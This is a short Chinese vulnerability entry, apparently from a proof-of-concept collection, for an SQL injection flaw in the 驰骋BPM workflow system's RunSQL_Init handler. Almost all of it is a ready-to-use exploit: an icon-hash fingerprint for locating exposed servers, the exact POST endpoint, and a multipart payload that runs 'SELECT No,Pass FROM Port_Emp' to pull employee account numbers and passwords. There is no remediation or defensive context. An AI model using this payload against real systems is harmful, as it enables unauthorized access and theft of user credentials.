# 驰骋BPMRunSQL_InitSQL注入漏洞

驰骋BPMRunSQL_Init ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-1564380241"`
- **请求**：`POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1`

**Payload**
```
------123128312312389898yd98ays98d
Content-Disposition: form-data; name="SQL"
SELECT No,Pass FROM Port_Emp
------123128312312389898yd98ays98d--
```
- **响应特征**：200